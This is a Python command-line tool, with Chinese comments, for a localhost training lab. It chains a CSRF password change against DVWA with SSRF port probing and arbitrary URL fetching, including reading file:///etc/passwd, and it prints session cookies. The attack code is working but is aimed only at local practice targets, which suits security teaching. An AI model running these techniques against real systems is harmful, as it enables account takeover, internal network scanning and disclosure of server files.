#!/usr/bin/env python3
"""15 · CSRF 与 SSRF 攻击链 —— 主工具

用法:
    python3 csrf_ssrf_lab.py session [--level low|medium|high]   # 登录 DVWA，打印 cookie
    python3 csrf_ssrf_lab.py check --password X                 # 试登录 X，判定密码状态
    python3 csrf_ssrf_lab.py restore --password X               # 用 X 登录后改回 password
    python3 csrf_ssrf_lab.py probe [--ports 8612,3306,8601,3999] # 经 SSRF 靶探测端口
    python3 csrf_ssrf_lab.py fetch --url file:///etc/passwd     # 经 SSRF 靶读任意 URL

只打本机 DVWA（127.0.0.1:8612）与自建的 SSRF 靶（127.0.0.1:8602）。
"""
import argparse
import re
import sys
import time

import requests

BASE = "http://127.0.0.1:8612"
SSRF = "http://127.0.0.1:8602"


def login(level="low", pwd="password"):
    s = requests.Session()
    r = s.get(f"{BASE}/login.php", timeout=5)
    tok = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
    r = s.post(f"{BASE}/login.php", timeout=5,
               data={"username": "admin", "password": pwd,
                     "Login": "Login", "user_token": tok})
    if "login.php" in r.url:
        raise SystemExit("[!] 登录失败（密码不对？）")
    r = s.get(f"{BASE}/security.php", timeout=5)
    tok = re.search(r"name='user_token' value='([^']+)'", r.text).group(1)
    s.post(f"{BASE}/security.php", timeout=5,
           data={"security": level, "seclev_submit": "Submit", "user_token": tok})
    return s


def try_login(pwd):
    try:
        s = login("low", pwd)
    except SystemExit:
        return False
    return "login.php" not in s.get(f"{BASE}/index.php", timeout=5).url


def cookie_header(s):
    return "; ".join(f"{k}={v}" for k, v in s.cookies.items())


def change(from_pwd, to_pwd):
    s = login("low", from_pwd)
    r = s.get(f"{BASE}/vulnerabilities/csrf/", timeout=5,
              params={"password_new": to_pwd, "password_conf": to_pwd, "Change": "Change"})
    return "Password Changed." in r.text


def classify(body):
    """SSRF 盲探测：只看跳板服务返回的响应文本判断端口状态。"""
    low = body.lower()
    if "connection refused" in low or "errno 61" in low:
        return "closed"
    if "timed out" in low or "timeout" in low:
        return "filtered"
    return "open"


def cmd_session(a):
    s = login(level=getattr(a, "level", "low"))
    print(cookie_header(s))
    return 0


def cmd_check(a):
    ok = try_login(a.password)
    print(f"[check] 尝试登录（密码 {a.password}）：{'成功' if ok else '失败'}")
    return 0 if ok else 1


def cmd_restore(a):
    if not try_login(a.password):
        print(f"[restore] 用 {a.password} 登录失败——无法还原")
        return 1
    if not change(a.password, "password"):
        print("[restore] 改回 password 失败")
        return 1
    if try_login("password"):
        print("[restore] 已把密码改回 password 并验证登录成功 ✓")
        return 0
    print("[restore] 还原后验证登录失败！")
    return 1


def cmd_probe(a):
    ports = [int(p) for p in a.ports.split(",")]
    print(f"[probe] 经 SSRF 靶（127.0.0.1:8602）探测 127.0.0.1 的 {len(ports)} 个端口：")
    print("  端口   判定      耗时      长度    证据")
    verdicts = {}
    for port in ports:
        url = f"http://127.0.0.1:{port}/"
        t0 = time.time()
        try:
            r = requests.get(f"{SSRF}/fetch", params={"url": url}, timeout=6)
            body = r.text
        except Exception as e:
            body = f"ERROR: {type(e).__name__}"
        ms = int((time.time() - t0) * 1000)
        verdict = classify(body)
        first = body.strip().splitlines()[0] if body.strip() else "-"
        print(f"  {port:<6} {verdict:<8} {ms:>4}ms  {len(body):>5}B  {first[:46]}")
        verdicts[port] = verdict
    ok = verdicts.get(3306) == "open"
    print(f"[probe] 结论：3306 判定为 {'open（响应差异命中）' if ok else '非 open'}")
    return 0 if ok else 1


def cmd_fetch(a):
    r = requests.get(f"{SSRF}/fetch", params={"url": a.url}, timeout=6)
    print(f"[fetch] 经 SSRF 靶读取：{a.url}")
    print(r.text.rstrip())
    return 0


def main():
    ap = argparse.ArgumentParser(description="CSRF 与 SSRF 攻击链（仅本机靶场）")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p0 = sub.add_parser("session")
    p0.add_argument("--level", default="low", choices=["low", "medium", "high"])
    p0.set_defaults(func=cmd_session)

    p1 = sub.add_parser("check")
    p1.add_argument("--password", required=True)
    p1.set_defaults(func=cmd_check)

    p2 = sub.add_parser("restore")
    p2.add_argument("--password", required=True)
    p2.set_defaults(func=cmd_restore)

    p3 = sub.add_parser("probe")
    p3.add_argument("--ports", default="8612,3306,8601,3999")
    p3.set_defaults(func=cmd_probe)

    p4 = sub.add_parser("fetch")
    p4.add_argument("--url", required=True)
    p4.set_defaults(func=cmd_fetch)

    args = ap.parse_args()
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 已中断", file=sys.stderr)
        sys.exit(130)
